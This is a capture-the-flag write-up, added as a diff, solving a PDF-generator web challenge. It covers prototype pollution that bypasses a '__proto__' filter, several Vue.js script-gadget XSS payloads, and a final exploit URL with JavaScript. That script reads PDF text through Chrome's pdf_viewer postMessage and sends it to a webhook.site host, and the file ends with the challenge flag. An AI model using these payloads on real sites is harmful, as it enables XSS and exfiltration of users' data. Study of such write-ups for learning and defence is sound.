@@ -1,0 +1,54 @@
+Intended Solution
+	Prototype pollution in the location.search parameters parsing, finding a script gadget in Vue.js to get XSS. And interesting part is to read the flag in the PDF using postMessage supported by chrome pdf_viewer.
+
+# Prototype Pollution
+	var params = parseQuery(location.search.slice(1));
+
+But in bundle.js
+	function parseQuery(params, valueDeserializer) {
+	...
+		if(currentName !== "__proto__")
+                 current[lastPart] = valueDeserializer(value);
+
+
+    A little filter to restrict prototype pollution by blocking "__proto__" as a property. But, we can pollute the prototype of Object by polluting "constructor.prototype" property of an object.
+
+So, we can do Prototype Pollution with
+	https://pdfgen.ctf.zer0pts.com:8443/text?text=text&asd[constructor][prototype][pollute]=polluted
+
+	=> asd[constructor][prototype][pollute]=polluted
+
+	let asd;
+	asd.pollute
+	=> "polluted"
+
+# Script Gadget
+	var params = parseQuery(`constructor[prototype][props][][value]=a&constructor[prototype][name]=":''.constructor.constructor('alert(1337)')(),"`)
+
+	//var params = parseQuery(`constructor[prototype][v-if]=_c.constructor('alert(1337)')()`)
+
+	//var params = parseQuery('constructor[prototype][data]=a&constructor[prototype][template][nodeType]=a&constructor[prototype][template][innerHTML]="<script>alert(1337)<\/script>"')
+
+	//var params = parseQuery(`constructor[prototype][v-bind:class]=''.constructor.constructor('alert(1337)')()`)
+	
+
+# Read Flag in the PDF using pdf_viewer postMessage
+	Source: https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/resources/pdf/pdf_viewer.js;l=770
+
+
+===================== Intended Solution =====================
+Report
+```
+https://pdfgen.ctf.zer0pts.com:8443/text?texts=asd&a[constructor][prototype][props][][value]=a&a[constructor][prototype][name]=a":''.constructor.constructor('eval(decodeURIComponent(location.hash.slice(1)))')(),"a#
+window.addEventListener('message', (e) => {
+ if (e.data.type === 'getSelectedTextReply') {
+   (new Image).src = ['https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a?data=', e.data.selectedText];
+ }
+});
+(async () => {
+ const wait = x => new Promise(r=>{setTimeout(r,x)});
+ document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*');
+ document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');
+})();
+```
+	,zer0pts{4fraid_of_unintended)_D0nt_w4nn4_l3ak_1nf0_about_s0lut1on}
